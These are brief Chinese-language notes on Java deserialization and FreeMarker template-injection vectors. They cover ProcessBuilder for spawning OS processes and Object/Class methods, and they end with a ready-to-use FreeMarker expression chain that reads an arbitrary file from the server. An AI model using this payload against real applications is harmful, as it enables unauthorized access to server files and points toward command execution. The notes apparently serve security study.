设计反序列向量时，查看代码的对象引用以确定全限定名。


## ProcessBuilder

ProcessBuilder 该类用于创建操作系统进程。

https://docs.oracle.com/javase/8/docs/api/java/lang/ProcessBuilder.html

- start()方法创建一个新的 Process使用这些属性

```java
ProcessBuilder pb =
new ProcessBuilder("myCommand", "myArg1", "myArg2");
```

## java.lang.Object


- `getClass()`
    返回运行时 class Object


- `toString()`
    返回对象的字符串表示

### java.lang.Class

继承 Object 的属性，拥有大量额外属性

其中拥有读取文件的链
```freemarker
${foo_classObj.getProtectionDomain().getCodeSource().getLocation().toURI().resolve('文件路径').toURL().openStream().readAllBytes()?join(" ")}
```